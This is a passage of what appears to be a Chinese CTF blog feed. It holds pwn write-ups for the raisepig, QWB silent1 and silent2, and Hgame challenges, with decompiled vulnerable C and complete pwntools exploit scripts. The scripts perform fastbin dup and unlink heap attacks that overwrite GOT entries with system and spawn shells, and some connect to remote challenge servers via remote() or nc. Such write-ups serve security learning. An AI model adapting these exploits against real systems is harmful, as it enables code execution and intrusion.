class="string">'./raisepig2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./raisepig2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">gdb.attach(p,a)</span><br><span class="line"><span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelen,name,pigtype,shell=<span class="number">0</span>)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Length of the name :'</span>,str(namelen))</span><br><span class="line">p.sendafter(<span class="string">'The name of pig :'</span>,name)</span><br><span class="line"><span class="keyword">if</span> shell == <span class="number">0</span>:</span><br><span class="line">p.sendlineafter(<span class="string">'The type of the pig :'</span>,pigtype)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Which pig do you want to eat:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat_all</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice : '</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc addr</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'0'</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">0x28</span>,<span class="string">'1'</span>,<span class="string">'1'</span>)</span><br><span class="line">eat(<span class="number">0</span>)</span><br><span class="line">eat(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'2'</span>*<span class="number">8</span>,<span class="string">'2'</span>)</span><br><span class="line">visit()</span><br><span class="line">p.recvuntil(<span class="string">'22222222'</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'0x%x'</span> % libc.address)</span><br><span class="line">success(<span class="string">'0x%x'</span> % libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'3'</span>,<span class="string">'3'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'4'</span>,<span class="string">'4'</span>)</span><br><span class="line">eat(<span class="number">3</span>)</span><br><span class="line">eat(<span class="number">4</span>)</span><br><span class="line">eat(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x9d</span>),<span class="string">'5'</span>)</span><br><span class="line"><span class="comment">#add(0x60,p64(libc.symbols["__malloc_hook"]-0x23),'5')</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'6'</span>,<span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'7'</span>,<span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span>*<span class="number">3</span></span><br><span class="line">payload += <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0xffffffff</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload,<span class="string">'8'</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x60,'a'*0x13+p64(one_gadget),'8')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;raisepig&quot;&gt;&lt;a href=&quot;#raisepig&quot; class=&quot;headerlink&quot; title=&quot;raisepig&quot;&gt;&lt;/a&gt;raisepig&lt;/h3&gt;&lt;p&gt;跟pwnable.tw的Secret Garden非常似。菜单有5个选项：&lt;br&gt;&lt;figu
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>qwb-pwn-silent1&amp;2</title>
    <link href="http://yoursite.com/2018/04/04/qwb-pwn-silent1&amp;2/"/>
    <id>http://yoursite.com/2018/04/04/qwb-pwn-silent1&amp;2/</id>
    <published>2018-04-04T03:04:57.000Z</published>
    <updated>2018-04-12T08:33:41.834Z</updated>
    
    <content type="html"><![CDATA[<p>好菜，只做了一题，慢慢补~</p><h3 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h3><p>程序有3个功能，分别是add，delete和edit</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%lu"</span>, &amp;size);</span><br><span class="line">  getchar();</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  read_(v3, size);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt;= <span class="number">9</span> &amp;&amp; s[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  s[i] = (<span class="keyword">char</span> *)v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在add中可以控制malloc的大小。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">free_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="built_in">free</span>(s[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>free之后没有清空指针，可以进行fastbin dup修改got，在0x601ffa处发现满足size条件，要求fastbin大小为0x60，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">remote_addr = <span class="string">'39.107.32.132'</span></span><br><span class="line">remote_port = <span class="number">10000</span></span><br><span class="line">p = remote(remote_addr,remote_port)</span><br><span class="line">elf = ELF(<span class="string">'./'</span>+target)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line"></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'a'</span>*<span class="number">79</span>)</span><br><span class="line">add(<span class="number">80</span>,<span class="string">'b'</span>*<span class="number">79</span>)</span><br><span class="line">add(<span class="number">80</span>,<span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">79</span>,<span class="string">'\x01'</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#a</span></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#b-&gt;a</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#a-&gt;b-&gt;a</span></span><br><span class="line"></span><br><span class="line">fake_addr = <span class="number">0x601ffa</span></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">payload = p64(fake_addr).ljust(<span class="number">79</span>,<span class="string">'\x01'</span>)</span><br><span class="line">add(<span class="number">80</span>,payload) <span class="comment">#a</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'d'</span>*<span class="number">79</span>) <span class="comment">#b</span></span><br><span class="line">add(<span class="number">80</span>,<span class="string">'e'</span>*<span class="number">79</span>) <span class="comment">#a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'$0'</span>+<span class="string">'\x00'</span>*<span class="number">12</span>+p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">80</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#delete(6)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>方法二：这里要用到edit的功能<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">edit_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(s[v1]);</span><br><span class="line">  read_(s[v1], v2 + <span class="number">1</span>);</span><br><span class="line">  read_(&amp;unk_602120, <span class="number">48L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路是：通过edit修改fastbin中的fd，然后修改ID=0的地址，进行任意地址写。</p><p>脚本如下：(不加sleep，不保证每次都成功)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,content,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line">p.send(content)</span><br><span class="line">p.send(content2)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x5f</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#a</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#b-&gt;a</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x60209d</span>),<span class="string">'\n'</span>) <span class="comment">#修改a的fd</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">0x5f</span>) <span class="comment">#a</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(<span class="number">0x602018</span>)) <span class="comment">#修改ID=0的地址为free@got</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x400730</span>),<span class="string">'\n'</span>) <span class="comment">#改成system@plt</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="silent2"><a href="#silent2" class="headerlink" title="silent2"></a>silent2</h3><p>大体跟1差不多，不过这里add限制了大小，只能0x10或大于0x80，那么可以利用unsorted bins进行unlink<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add_</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">0x10</span> &amp;&amp; size &lt;= <span class="number">0x7F</span> ) <span class="comment">//这里改了</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路是：先申请两个0x100大小的chunk，然后free掉，再申请一个0x210的chunk，就会利旧刚刚free出来那两个chunk的空间，使用edit构造两个fake chunk(fake chunk1是free chunk，fake chunk2是allocated chunk)</p><p>再次delete(4)的时候，会触发unlink，最终结果是<code>p_addr</code>位置的地址就会改写是<code>&amp;p_addr-0x18</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,content,content2)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(id))</span><br><span class="line">p.send(content)</span><br><span class="line">p.send(content2)</span><br><span class="line"></span><br><span class="line">list_addr = <span class="number">0x6020C0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'BBBB'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'CCCC'</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'DDDD'</span>) <span class="comment">#3 &lt;-</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'EEEE'</span>) <span class="comment">#4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(list_addr+<span class="number">0x18</span><span class="number">-0x18</span>)+p64(list_addr+<span class="number">0x18</span><span class="number">-0x10</span>)+<span class="string">'A'</span>*(<span class="number">0x100</span><span class="number">-0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x210</span><span class="number">-0x100</span>) <span class="comment"># fake chunk</span></span><br><span class="line">add(<span class="number">0x210</span>, payload) <span class="comment">#5 == 3+4</span></span><br><span class="line">delete(<span class="number">4</span>)  <span class="comment"># double free</span></span><br><span class="line">edit(<span class="number">3</span>,p64(elf.got[<span class="string">'free'</span>]),<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">'system'</span>]),<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'/bin/sh\x00'</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好菜，只做了一题，慢慢补~&lt;/p&gt;
&lt;h3 id=&quot;silent&quot;&gt;&lt;a href=&quot;#silent&quot; class=&quot;headerlink&quot; title=&quot;silent&quot;&gt;&lt;/a&gt;silent&lt;/h3&gt;&lt;p&gt;程序有3个功能，分别是add，delete和edit&lt;/p&gt;
&lt;f
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hgame pwn</title>
    <link href="http://yoursite.com/2018/02/07/Hgame-pwn/"/>
    <id>http://yoursite.com/2018/02/07/Hgame-pwn/</id>
    <published>2018-02-07T05:07:14.000Z</published>
    <updated>2018-03-19T01:26:43.993Z</updated>
    
    <content type="html"><![CDATA[<p>终于补完了Hgame的pwn，学到很多新姿势。</p><h3 id="guess-number"><a href="#guess-number" class="headerlink" title="guess_number"></a>guess_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"enter your guess:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%s"</span>, &amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"OHHHHHHH! u did it !\norz orz orz orz\nhere is your flag:"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>虽然开了canary，但是只要输入的东西覆盖到随机数，判断一样就cat flag了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ distance  0xffffd39c 0xffffd4b0</span><br><span class="line">From 0xffffd39c to 0xffffd4b0: 276 bytes, 69 dwords</span><br></pre></td></tr></table></figure></p><p>计算一下输入位置和随机数的距离，输入一堆’1’，<code>atoi</code>会将输入转成0x7fffffff。那么payload：<code>python -c &quot;from pwn import *;print &#39;1&#39;*276+p32(0x7fffffff)&quot; |nc 111.230.149.72 10002</code></p><h3 id="flag-server"><a href="#flag-server" class="headerlink" title="flag_server"></a>flag_server</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">while</span> ( v5 &gt; <span class="number">63</span> || !v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"sorry,your username is too LOOOOOOOOONG~~\nplease input again.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your username length: "</span>);</span><br><span class="line">    <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      ;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"whats your username?"</span>);</span><br><span class="line">  read_n(&amp;s1, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"admin"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v3);</span><br><span class="line">    v8 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello admin, please input the key: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%u"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 != v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"noooo, you are not the TRUE admin!!!\nwho are you???"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello %s, here is what I want to tell you:"</span>, &amp;s1);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_8048BF4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>虽然限制了username长度，可以输入负数直接绕过，然后输入一大堆’1’，将v10覆盖了就OK。</p><h3 id="zazahui"><a href="#zazahui" class="headerlink" title="zazahui"></a>zazahui</h3><p>神经病题目~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = fopen(<span class="string">"ad"</span>, <span class="string">"r"</span>);</span><br><span class="line">v1 = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">__isoc99_fscanf(v0, <span class="string">"%s"</span>, &amp;ad);</span><br><span class="line"><span class="keyword">return</span> __isoc99_fscanf(v1, <span class="string">"%s"</span>, &amp;flag);</span><br></pre></td></tr></table></figure></p><p>广告词和flag都读到bss段了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">s = (<span class="keyword">char</span> *)&amp;ad;</span><br><span class="line">v3 = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format, v3);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  getinput((<span class="keyword">int</span>)&amp;s1, <span class="number">188</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">"fuck it"</span>) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"me too! again!!!\n"</span>);</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"that's not right :(\n"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>只要将s覆盖成flag的地址就可以，不用计算距离，直接干！payload：<code>python -c &quot;from pwn import *;print 100*p32(0x0804A060)&quot; |nc 111.230.149.72 10003</code></p><h3 id="zazahui-ver2"><a href="#zazahui-ver2" class="headerlink" title="zazahui_ver2"></a>zazahui_ver2</h3><p>打印广告词的代码移到while外了，不会每轮都打印广告，思路是照样覆盖s为flag地址，在strcmp那里做爆破，由于flag是0x00结尾，我们可以输入0x00，然后flag地址不停+1，直到提示right爆破出长度，然后再从后往前逐位爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 